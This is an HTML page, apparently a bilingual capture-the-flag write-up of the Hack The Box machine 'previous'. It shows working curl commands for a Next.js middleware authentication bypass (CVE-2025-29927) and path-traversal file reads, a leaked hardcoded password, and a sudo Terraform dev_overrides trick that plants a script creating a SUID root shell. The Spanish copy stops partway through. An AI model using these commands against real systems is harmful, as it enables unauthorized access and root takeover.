@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>previous | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">previous</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a Next.js 15.2.2 application with a known middleware authentication bypass vulnerability (CVE-2025-29927). By exploiting this bypass, I gained unauthorized access to protected endpoints including an LFI vulnerability in <code>/api/download</code> that allowed reading arbitrary files from the filesystem.</p>
+                    
+                    <p>Through the LFI, I extracted the compiled Next.js authentication configuration file containing hardcoded credentials for user <code>jeremy</code>. These credentials provided SSH access to the machine. Once inside, I discovered that <code>jeremy</code> had sudo privileges to execute <code>terraform</code> with the <code>-chdir</code> option.</p>
+                    
+                    <p>The privilege escalation was achieved by exploiting Terraform's <code>TF_CLI_CONFIG_FILE</code> environment variable combined with the <code>!env_reset</code> sudo configuration. By creating a malicious Terraform CLI configuration file that used <code>dev_overrides</code> to redirect the provider source to a controlled directory, I was able to execute an arbitrary binary as root when Terraform attempted to load the provider plugin.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Next.js middleware bypass (CVE-2025-29927), Local File Inclusion via path traversal, Terraform provider development override exploitation, sudo environment variable preservation abuse.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Initial Reconnaissance</h2>
+                <p>I start with an nmap scan to identify open ports and running services on the target machine:</p>
+                <p><img src="./media/image3.png" alt="Nmap scan results showing open ports including SSH on 22 and HTTP on 80" /></p>
+                
+                <p>The scan reveals SSH on port 22 and HTTP on port 80. I add <code>previous.htb</code> to my <code>/etc/hosts</code> file for easier access.</p>
+                
+                <h2>Web Enumeration - Next.js Application</h2>
+                <p>Browsing to the web application, I find a contact button that reveals an email address: <code>jeremy@previous.htb</code>. Most buttons redirect to a login page at <code>/signin</code>.</p>
+                
+                <p>Running <code>whatweb</code> provides more information about the technology stack:</p>
+                <pre><code class="language-bash">whatweb http://previous.htb</code></pre>
+                
+                <pre><code class="language-plaintext">http://previous.htb [200 OK] Country[RESERVED][ZZ], Email[jeremy@previous.htb], 
+HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.83], 
+Script[application/json], X-Powered-By[Next.js], nginx[1.18.0]</code></pre>
+                
+                <p>The application is powered by Next.js, though the exact version isn't immediately visible. I run gobuster to discover additional paths:</p>
+                
+                <pre><code class="language-plaintext">/docs (Status: 307) [Size: 36] [--> /api/auth/signin?callbackUrl=%2Fdocs]
+/api (Status: 307) [Size: 35] [--> /api/auth/signin?callbackUrl=%2Fapi]
+/signin (Status: 200) [Size: 3481]
+/docsis (Status: 307) [Size: 38] [--> /api/auth/signin?callbackUrl=%2Fdocsis]
+/apis (Status: 307) [Size: 36] [--> /api/auth/signin?callbackUrl=%2Fapis]
+/apidocs (Status: 307) [Size: 39] [--> /api/auth/signin?callbackUrl=%2Fapidocs]</code></pre>
+                
+                <p>All paths except <code>/signin</code> redirect to the authentication page, indicating middleware protection.</p>
+                
+                <h2>Next.js Middleware Authentication Bypass</h2>
+                <p>As a Next.js developer myself, I'm aware of a recent and recurring vulnerability that allows bypassing middleware authentication. The vulnerability is documented at <a href="https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass">ProjectDiscovery's blog</a>.</p>
+                
+                <p>I test if the target is running a vulnerable version (Next.js 13.2.0 or later) by attempting the middleware bypass:</p>
+                <p><img src="./media/image10.png" alt="Browser showing successful middleware bypass accessing protected content" /></p>
+                
+                <p>Success! The application is indeed vulnerable. The bypass works by adding specific headers to the request that make Next.js treat it as an internal middleware subrequest, effectively skipping authentication checks.</p>
+                
+                <h3>Automating the Bypass with Burp Suite</h3>
+                <p>To make exploitation easier, I configure Burp Suite with a match-and-replace rule to automatically apply the middleware bypass header to all my requests:</p>
+                <p><img src="./media/image5.png" alt="Burp Suite match and replace rule configuration" /></p>
+                
+                <p>This allows me to browse the application naturally while automatically bypassing authentication on every request:</p>
+                <p><img src="./media/image8.png" alt="Burp Suite showing the header being automatically added to requests" /></p>
+                
+                <h2>Discovering Local File Inclusion (LFI)</h2>
+                <p>While exploring the authenticated sections of the application (which appears to be a code documentation platform), I discover a download functionality at <code>/api/download?example={file}</code>. This endpoint is intended to download code sample files.</p>
+                
+                <p>Testing for path traversal, I attempt to read <code>/etc/passwd</code>:</p>
+                <pre><code class="language-bash">curl -X GET "http://previous.htb/api/download?example=../../../../../../../../../etc/passwd" \
+  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"</code></pre>
+                
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+node:x:1000:1000::/home/node:/bin/sh
+nextjs:x:1001:65533::/home/nextjs:/sbin/nologin</code></pre>
+                
+                <p>The LFI works perfectly! I can see two notable users: <code>root</code> and <code>node</code>, both with shell access. I attempt to read <code>/home/node/.ssh/id_rsa</code> but the file doesn't exist, suggesting this might be running in a container.</p>
+                
+                <h3>Mapping the Application Structure</h3>
+                <p>I systematically explore the filesystem to understand the application structure. Based on Next.js conventions, I test paths relative to the web root:</p>
+                <pre><code class="language-bash">curl -X GET "http://previous.htb/api/download?example=../../.env" \
+  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"</code></pre>
+                
+                <pre><code class="language-plaintext">NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a</code></pre>
+                
+                <p>I successfully retrieve the <code>.env</code> file, which contains the NextAuth secret. This confirms the application root is two directories above the download endpoint. I also extract <code>package.json</code> to identify exact library versions:</p>
+                
+                <pre><code class="language-json">"dependencies": {
+  "@mdx-js/loader": "^3.1.0",
+  "@mdx-js/react": "^3.1.0",
+  "@next/mdx": "^15.3.0",
+  "@tailwindcss/postcss": "^4.1.3",
+  "@tailwindcss/typography": "^0.5.16",
+  "@types/mdx": "^2.0.13",
+  "next": "^15.2.2",
+  "next-auth": "^4.24.11",
+  "postcss": "^8.5.3",
+  "react": "^18.2.0",
+  "react-dom": "^18.2.0",
+  "tailwindcss": "^4.1.3"
+},
+"devDependencies": {
+  "@types/node": "22.14.0",
+  "@types/react": "19.1.0",
+  "typescript": "5.8.3"
+}</code></pre>
+                
+                <p>Next.js version 15.2.2 is confirmed, along with next-auth for authentication.</p>
+                
+                <h3>Confirming Containerized Environment</h3>
+                <p>Reading <code>/proc/self/environ</code> provides environment variables from the running process:</p>
+                <pre><code class="language-bash">curl -X GET "http://previous.htb/api/download?example=../../../../../../../../../proc/self/environ" \
+  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"</code></pre>
+                
+                <pre><code class="language-plaintext">NODE_VERSION=18.20.8HOSTNAME=0.0.0.0YARN_VERSION=1.22.22SHLVL=1PORT=3000
+HOME=/home/nextjsPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+NEXT_TELEMETRY_DISABLED=1PWD=/appNODE_ENV=production</code></pre>
+                
+                <p>The environment variables confirm this is indeed a containerized application running in <code>/app</code> with the <code>nextjs</code> user.</p>
+                
+                <h2>Extracting Hardcoded Credentials</h2>
+                <p>I attempt to read various authentication-related files. After several tries targeting Next.js build artifacts, I successfully extract the compiled NextAuth configuration file:</p>
+                
+                <pre><code class="language-bash">curl -X GET "http://previous.htb/api/download?example=../../.next/server/pages/api/auth/\[...nextauth\].js" \
+  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"</code></pre>
+                
+                <p>The response contains minified JavaScript code. Within this compiled code, I find the authentication logic:</p>
+                
+                <pre><code class="language-javascript">authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??
+"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null</code></pre>
+                
+                <p>This reveals the authentication implementation. The code checks if the username is <code>jeremy</code> and the password matches either the <code>ADMIN_SECRET</code> environment variable (which isn't set, as we saw in the <code>.env</code> file) or defaults to the hardcoded value <code>MyNameIsJeremyAndILovePancakes</code>.</p>
+                
+                <p>I now have valid credentials: <code>jeremy:MyNameIsJeremyAndILovePancakes</code></p>
+                
+                <h2>Initial Access via SSH</h2>
+                <p>I attempt SSH connection with the discovered credentials:</p>
+                <pre><code class="language-bash">ssh jeremy@previous.htb</code></pre>
+                
+                <p>The credentials work! I successfully gain SSH access as user <code>jeremy</code> and can retrieve the user flag:</p>
+                <p><img src="./media/image7.png" alt="Terminal showing successful SSH login and user flag retrieval" /></p>
+                
+                <h2>Privilege Escalation - Terraform Sudo Misconfiguration</h2>
+                <p>After gaining initial access, I check what sudo privileges the <code>jeremy</code> user has:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+                
+                <p><img src="./media/image2.png" alt="Output of sudo -l showing terraform permissions and environment variable configuration" /></p>
+                
+                <p>The output reveals several interesting details:</p>
+                <pre><code class="language-plaintext">Defaults:jeremy !env_reset
+Defaults:jeremy env_delete+=PATH
+User jeremy may run the following commands on previous:
+    (root) NOPASSWD: /usr/bin/terraform -chdir\=/opt/examples *</code></pre>
+                
+                <p>Three critical pieces of information:</p>
+                <ol>
+                    <li><code>!env_reset</code> - Environment variables are NOT reset when using sudo (unusual security configuration)</li>
+                    <li><code>env_delete+=PATH</code> - Only the PATH variable is deleted for security</li>
+                    <li>I can run <code>terraform</code> as root with the <code>-chdir=/opt/examples</code> option</li>
+                </ol>
+                
+                <p>Checking the Terraform version:</p>
+                <pre><code class="language-bash">terraform --version</code></pre>
+                
+                <pre><code class="language-plaintext">Terraform v1.13.0
+on linux_amd64
++ provider previous.htb/terraform/examples v1.0.0</code></pre>
+                
+                <p>This is a very recent version of Terraform.</p>
+                
+                <h3>Analyzing the Terraform Configuration</h3>
+                <p>The <code>/opt/examples</code> directory contains Terraform configuration files, all owned by root:</p>
+                <pre><code class="language-plaintext">-rw-r--r-- 1 root root   18 Apr 12 20:32 .gitignore
+-rw-r--r-- 1 root root  576 Aug 21 18:15 main.tf
+drwxr-xr-x 3 root root 4.0K Aug 21 20:09 .terraform
+-rw-r--r-- 1 root root  247 Aug 21 18:16 .terraform.lock.hcl
+-rw-r--r-- 1 root root 1.1K Sep 25 20:55 terraform.tfstate</code></pre>
+                
+                <p>I cannot modify these files directly. The <code>main.tf</code> file uses a custom provider:</p>
+                <pre><code class="language-hcl">terraform {
+  required_providers {
+    examples = {
+      source = "previous.htb/terraform/examples"
+    }
+  }
+}</code></pre>
+                
+                <h3>Understanding the Exploitation Path</h3>
+                <p>The key insight is the combination of:</p>
+                <ul>
+                    <li>Sudo allows running Terraform as root</li>
+                    <li>Environment variables are preserved (<code>!env_reset</code>)</li>
+                    <li>Terraform supports environment variables for configuration</li>
+                </ul>
+                
+                <p>After researching Terraform's environment variables, I discover <code>TF_CLI_CONFIG_FILE</code>, which allows specifying a custom CLI configuration file: <a href="https://developer.hashicorp.com/terraform/cli/config/environment-variables#tf_cli_config_file">https://developer.hashicorp.com/terraform/cli/config/environment-variables#tf_cli_config_file</a></p>
+                
+                <h3>Terraform Provider Override Exploitation</h3>
+                <p>Terraform's CLI configuration file supports <code>dev_overrides</code> for provider developers, documented at: <a href="https://developer.hashicorp.com/terraform/cli/config/config-file#development-overrides-for-provider-developers">https://developer.hashicorp.com/terraform/cli/config/config-file#development-overrides-for-provider-developers</a></p>
+                
+                <p>This feature allows overriding the source location of provider plugins for development purposes, and critically, it disables version and checksum verification. This means Terraform will execute whatever binary is in the specified directory as long as it follows the naming convention.</p>
+                
+                <p>I create a custom Terraform CLI configuration in my home directory:</p>
+                <pre><code class="language-bash">cat > ~/.terraformrc << 'EOF'
+provider_installation {
+  dev_overrides {
+    "previous.htb/terraform/examples" = "/home/jeremy/malicious_provider"
+  }
+  direct {}
+}
+EOF</code></pre>
+                
+                <p>Next, I create the directory and a malicious provider binary. The binary must be executable and follow Terraform's naming convention: <code>terraform-provider-{name}</code>:</p>
+                
+                <pre><code class="language-bash">mkdir -p /home/jeremy/malicious_provider</code></pre>
+                
+                <p>I create a simple shell script that will execute as root:</p>
+                <pre><code class="language-bash">cat > /home/jeremy/malicious_provider/terraform-provider-examples << 'EOF'
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod 4755 /tmp/rootbash
+EOF
+
+chmod +x /home/jeremy/malicious_provider/terraform-provider-examples</code></pre>
+                
+                <p>This script will create a SUID bash binary when executed as root.</p>
+                
+                <h3>Executing the Privilege Escalation</h3>
+                <p>Now I export the environment variable and run Terraform with sudo:</p>
+                <pre><code class="language-bash">export TF_CLI_CONFIG_FILE="$HOME/.terraformrc"
+sudo /usr/bin/terraform -chdir=/opt/examples init</code></pre>
+                
+                <p><img src="./media/image6.png" alt="Initial terraform error showing the binary name requirement" /></p>
+                
+                <p>Terraform attempts to load the provider and validates the binary name. After confirming the correct naming convention, I verify the setup:</p>
+                <p><img src="./media/image1.png" alt="Terminal showing the correctly named provider binary" /></p>
+                
+                <p>Running the command again:</p>
+                <p><img src="./media/image9.png" alt="Terraform output showing the provider override being used" /></p>
+                
+                <p>The command executes successfully, and more importantly, the malicious binary was executed as root:</p>
+                <p><img src="./media/image4.png" alt="Terminal showing the SUID rootbash binary created with root ownership" /></p>
+                
+                <p>The SUID bash binary has been created with root ownership and the setuid bit set. I can now execute it to gain root privileges:</p>
+                <pre><code class="language-bash">/tmp/rootbash -p</code></pre>
+                
+                <p>This grants me a root shell, allowing me to retrieve the root flag and complete the machine.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una aplicación Next.js 15.2.2 con una vulnerabilidad conocida de bypass de autenticación en el middleware (CVE-2025-29927). Explotando este bypass, obtuve acceso no autorizado a endpoints protegidos, incluyendo una vulnerabilidad LFI en <code>/api/download</code> que permitía leer archivos arbitrarios del sistema de archivos.</p>
+                    
+                    <p>A través del LFI, extraje el archivo de configuración de autenticación compilado de Next.js que contenía credenciales hardcodeadas para el usuario <code>jeremy</code>. Estas credenciales proporcionaron acceso SSH a la máquina. Una vez dentro, descubrí que <code>jeremy</code> tenía privilegios sudo para ejecutar <code>terraform</code> con la opción <code>-chdir</code>.</p>
+                    
+                    <p>La escalada de privilegios se logró explotando la variable de entorno <code>TF_CLI_CONFIG_FILE</code> de Terraform combinada con la configuración sudo <code>!env_reset</code>. Creando un archivo de configuración CLI malicioso de Terraform que usaba <code>dev_overrides</code> para redirigir el source del provider a un directorio controlado, pude ejecutar un binario arbitrario como root cuando Terraform intentó cargar el plugin del provider.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Bypass de middleware de Next.js (CVE-2025-29927), Local File Inclusion mediante path traversal, explotación de override de provider de desarrollo de Terraform, abuso de preservación de variables de entorno en sudo.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios ejecutándose en la máquina objetivo:</p>
+                <p><img src="./media/image3.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el 22 y HTTP en el 80" /></p>
+                
+                <p>El escaneo revela SSH en el puerto 22 y HTTP en el puerto 80. Añado <code>previous.htb</code> a mi archivo <code>/etc/hosts</code> para facilitar el acceso.</p>
+                
+                <h2>Enumeración Web - Aplicación Next.js</h2>
+                <p>Navegando por la aplicación web, encuentro un botón de contacto que revela una dirección de correo electrónico: <code>jeremy@previous.htb</code>. La mayoría de los botones redirigen a una página de login en <code>/signin</code>.</p>
+                
+                <p>Ejecutando <code>whatweb</code> obtengo más información sobre el stack tecnológico:</p>
+                <pre><code class="language-bash">whatweb http://previous.htb</code></pre>
+                
+                <pre><code class="language-plaintext">http://previous.htb [200 OK] Country[RESERVED][ZZ], Email[jeremy@previous.htb], 
+HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.83], 
+Script[application/json], X-Powered-By[Next.js], nginx[1.18.0]</code></pre>
+                
+                <p>La aplicación está desarrollada con Next.js, aunque la versión exacta no es inmediatamente visible. Ejecuto gobuster para descubrir rutas adicionales:</p>
+                
+                <pre><code class="language-plaintext">/docs (Status: 307) [Size: 36] [--> /api/auth/signin?callbackUrl=%2Fdocs]
+/api (Status: 307) [Size: 35] [--> /api/auth/signin?callbackUrl=%2Fapi]
+/signin (Status: 200) [Size: 3481]
+/docsis (Status: 307) [Size: 38] [--> /api/auth/signin?callbackUrl=%2Fdocsis]
+/apis (Status: 307) [Size: 36] [--> /api/auth/signin?callbackUrl=%2Fapis]
+/apidocs (Status: 307) [Size: 39] [--> /api/auth/signin?callbackUrl=%2Fapidocs]</code></pre>
+                
+                <p>Todas las rutas excepto <code>/signin</code> redirigen a la página de autenticación, lo que indica protección mediante middleware.</p>
+                
+                <h2>Bypass de Autenticación del Middleware de Next.js</h2>
+                <p>Como desarrollador de Next.js, conozco una vulnerabilidad reciente y recurrente que permite hacer bypass de la autenticación del middleware. La vulnerabilidad está documentada en <a href="https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass">el blog de ProjectDiscovery</a>.</p>
+                
+                <p>Compruebo si el objetivo ejecuta una versión vulnerable (Next.js 13.2.0 o posterior) intentando el bypass del middleware:</p>
+                <p><img src="./media/image10.png" alt="Navegador mostrando el bypass exitoso del middleware accediendo a contenido protegido" /></p>
+                
+                <p>¡Éxito! La aplicación es efectivamente vulnerable. El bypass funciona añadiendo cabeceras específicas a la petición que hacen que Next.js la trate como una subrequest interna del middleware, saltándose efectivamente las comprobaciones de autenticación.</p>
+                
+                <h3>Automatizando el Bypass con Burp Suite</h3>
+                <p>Para facilitar la explotación, configuro Burp Suite con una regla de match-and-replace para aplicar automáticamente la cabecera de bypass del middleware a todas mis peticiones:</p>
+                <p><img src="./media/image5.png" alt="Configuración de la regla match and replace en Burp Suite" /></p>
+                
+                <p>Esto me permite navegar la aplicación de forma natural mientras automáticamente se hace bypass de la autenticación en cada petición:</p>
+                <p><img src="./media/image8.png" alt="Burp Suite mostrando la cabecera siendo añadida automáticamente a las peticiones" /></p>
+                
+                <h2>Descubriendo Local File Inclusion (LFI)</h2>
+                <p>Mientras exploro las secciones autenticadas de la aplicación (que parece ser una plataforma de documentación de código), descubro una funcionalidad de descarga en <code>/api/download?example={file}</code>. Este endpoint está destinado a descargar archivos de código de ejemplo.</p>
+                
+                <p>Probando path traversal, intento leer <code>/etc/passwd</code>:</p>
+                <pre><code class="language-bash">curl -X GET "http://previous.htb/api/download?example=../../../../../../../../../etc/passwd" \
+  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"</code></pre>
+                
+                <pre><code class="language-plaintext">root:x:0:0:root:/root:/bin/sh
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+node:x:1000:1000::/home/node:/bin/sh
+nextjs:x:1001:65533::/home/nextjs:/sbin/nologin</code></pre>
+                
+                <p>¡El LFI funciona perfectamente! Puedo ver dos usuarios notables: <code>root</code> y <code>node</code>, ambos con acceso a shell. Intento leer <code>/home/node/.ssh/id_rsa</code> pero el archivo no existe, sugiriendo que esto podría estar ejecutándose en un contenedor.</p>
+                
+                <h3>Mapeando la Estructura de la Aplicación</h3>
+                <p>Exploro sistemáticamente el sistema de archivos para entender la estructura de la aplicación. Basándome en las convenciones de Next.js, pruebo rutas relativas al web root:</p>
+                <pre><code class="language-bash">curl -X GET "http://previous.htb/api/download?example=../../.env" \
+  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"</code></pre>
+                
+                <pre><code class="language-plaintext">NEXTAUTH_SECRET=82a464f1c3509a81d5c973c31a23c61a</code></pre>
+                
+                <p>Consigo recuperar exitosamente el archivo <code>.env</code>, que contiene el secreto de NextAuth. Esto confirma que la raíz de la aplicación está dos directorios por encima del endpoint de descarga. También extraigo <code>package.json</code> para identificar las versiones exactas de las librerías:</p>
+                
+                <pre><code class="language-json">"dependencies": {
+  "@mdx-js/loader": "^3.1.0",
+  "@mdx-js/react": "^3.1.0",
+  "@next/mdx": "^15.3.0",
+  "@tailwindcss/postcss": "^4.1.3",
+  "@tailwindcss/typography": "^0.5.16",
+  "@types/mdx": "^2.0.13",
+  "next": "^15.2.2",
+  "next-auth": "^4.24.11",
+  "postcss": "^8.5.3",
+  "react": "^18.2.0",
+  "react-dom": "^18.2.0",
+  "tailwindcss": "^4.1.3"
+},
+"devDependencies": {
+  "@types/node": "22.14.0",
+  "@types/react": "19.1.0",
+  "typescript": "5.8.3"
+}</code></pre>
+                
+                <p>Se confirma la versión 15.2.2 de Next.js, junto con next-auth para la autenticación.</p>
+                
+                <h3>Confirmando el Entorno Contenerizado</h3>
+                <p>Leyendo <code>/proc/self/environ</code> obtengo variables de entorno del proceso en ejecución:</p>
+                <pre><code class="language-bash">curl -X GET "http://previous.htb/api/download?example=../../../../../../../../../proc/self/environ" \
+  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"</code></pre>
+                
+                <pre><code class="language-plaintext">NODE_VERSION=18.20.8HOSTNAME=0.0.0.0YARN_VERSION=1.22.22SHLVL=1PORT=3000
+HOME=/home/nextjsPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+NEXT_TELEMETRY_DISABLED=1PWD=/appNODE_ENV=production</code></pre>
+                
+                <p>Las variables de entorno confirman que efectivamente es una aplicación contenerizada ejecutándose en <code>/app</code> con el usuario <code>nextjs</code>.</p>
+                
+                <h2>Extrayendo Credenciales Hardcodeadas</h2>
+                <p>Intento leer varios archivos relacionados con la autenticación. Después de varios intentos apuntando a artefactos de compilación de Next.js, consigo extraer exitosamente el archivo de configuración compilado de NextAuth:</p>
+                
+                <pre><code class="language-bash">curl -X GET "http://previous.htb/api/download?example=../../.next/server/pages/api/auth/\[...nextauth\].js" \
+  -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"</code></pre>
+                
+                <p>La respuesta contiene código JavaScript minificado. Dentro de este código compilado, encuentro la lógica de autenticación:</p>
+                
+                <pre><code class="language-javascript">authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??
+"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null</code></pre>
+                
+                <p>Esto revela la implementación de autenticación. El código comprueba si el usuario es <code>jeremy</code> y si la contraseña coincide con la variable de entorno <code>ADMIN_SECRET</code> (que no está configurada, como vimos en el archivo <code>.env</code>) o por defecto usa el valor hardcodeado <code>MyNameIsJeremyAndILovePancakes</code>.</p>
+                
+                <p>Ahora tengo credenciales válidas: <code>jeremy:MyNameIsJeremyAndILovePancakes</code></p>
+                
+                <h2>Acceso Inicial vía SSH</h2>
+                <p>Intento conectar por SSH con las credenciales descubiertas:</p>
+                <pre><code class="language-bash">ssh jeremy@previous.htb</code></pre>
+                
+                <p>¡Las credenciales funcionan! Obtengo exitosamente acceso SSH como usuario <code>jeremy</code> y puedo recuperar la flag de usuario:</p>
+                <p><img src="./media/image7.png" alt="Terminal mostrando el login SSH exitoso y la recuperación de la flag de usuario" /></p>
+                
+                <h2>Escalada de Privilegios - Mala Configuración de Sudo en Terraform</h2>
+                <p>Tras obtener el acceso inicial, compruebo qué privilegios sudo tiene el usuario <code>jeremy</code>:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+                
+                <p><img src="./media/image2.png" alt="Salida de sudo -l mostrando permisos de terraform y configuración de variables de entorno" /></p>
+                
+                <p>La salida revela varios detalles interesantes:</p>
+                <pre><code class="language-plaintext">Defaults:jeremy !env_reset
+Defaults:jeremy env_delete+=PATH
+User jeremy may run the following commands on previous:
+    (root) NOPASSWD: /usr/bin/terraform -chdir\=/opt/examples *</code></pre>
+                
+                <p>Tres piezas críticas de información:</p>
+                <ol>
+                    <li><code>!env_reset</code> - Las variables de entorno NO se resetean al usar sudo (configuración de seguridad inusual)</li>
+                    <li><code>env_delete+=PATH</code> - Solo la variable PATH se elimina por seguridad</li>
+                    <li>Puedo ejecutar <code>terraform</code> como root con la opción <code>-chdir=/opt/examples</code></li>
+                </ol>
+                
+                <p>Comprobando la versión de Terraform:</p>
+                <pre><code class="language-bash">terraform --version</code></pre>
+                
+                <pre><code class="language-plaintext">Terraform v1.13.0
+on linux_amd64
++ provider previous.htb/terraform/examples v1.0.0</code></pre>
+                
+                <p>Esta es una versión muy reciente de Terraform.</p>
+                
+                <h3>Analizando la Configuración de Terraform</h3>
+                <p>El directorio <code>/opt/examples</code> contiene archivos de configuración de Terraform, todos propiedad de root:</p>
+                <pre><code class="language-plaintext">-rw-r--r-- 1 root root   18 Apr 12 20:32 .gitignore
+-rw-r--r-- 1 root root  576 Aug 21 18:15 main.tf
+drwxr-xr-x 3 root root 4.0K Aug 21 20:09 .terraform
+-rw-r--r-- 1 root root  247 Aug 21 18:16 .terraform.lock.hcl
+-rw-r--r-- 1 root root 1.1K Sep 25 20:55 terraform.tfstate</code></pre>
+                
+                <p>No puedo modificar estos archivos directamente. El archivo <code>main.tf</code> usa un provider personalizado:</p>
+                <pre><code class="language-hcl">terraform {
+  required_providers {
+    examples = {
+      source = "previous.htb/terraform/examples"
+    }
+  }
+}</code></pre>
+                
+                <h3>Entendiendo la Vía de Explotación</h3>
+                <p>La clave está en la combinación de:</p>
+                <ul>
+                    <li>Sudo permite ejecutar Terraform como root</li>
+                    <li>Las variables de entorno se preservan (<code>!env_reset</code>)</li>
+                    <li>Terraform soporta variables de entorno para configuración</li>
+                </ul>
+                
+                <p>Después de investigar las variables de entorno de Terraform, descubro <code>TF_CLI_CONFIG_FILE</code>, que permite especificar un archivo de configuración CLI personalizado: <a href="https://developer.hashicorp.com/terraform/cli/config/environment-variables#tf_cli_config_file">https://developer.hashicorp.com/terraform/cli/config/environment-variables#tf_cli_config_file</a></p>
+                
+                <h3>Explotación de Override de Provider de Terraform</h3>
+                <p>El archivo de configuración CLI de Terraform soporta <code>dev_overrides</code> para desarrolladores de providers, documentado en: <a href="https://developer.hashicorp.com/terraform/cli/config/config-file#development-overrides-for-provider-developers">https://developer.hashicorp.com/terraform/cli/config/config-file#development-overrides-for-provider-developers</a></p>
+                
+                <p>Esta característica permite sobrescribir la ubicación source de los plugins de provider para propósitos de desarrollo, y críticamente, deshabilita la verificación de versión y checksum. Esto significa que Terraform ejecutará cualquier binario que esté en el directorio especificado siempre que siga la convención de nombres.</p>
+                
+                <p>Creo una configuración CLI personalizada de Terraform en mi directorio home:</p>
+                <pre><code class="language-bash">cat > ~/.terraformrc << 'EOF'
+provider_installation {
+  dev_overrides {
+    "previous.htb/terraform/examples" = "/home/jeremy/malicious_provider"
+  }
+  direct {}
+}
+EOF</code></pre>
+                
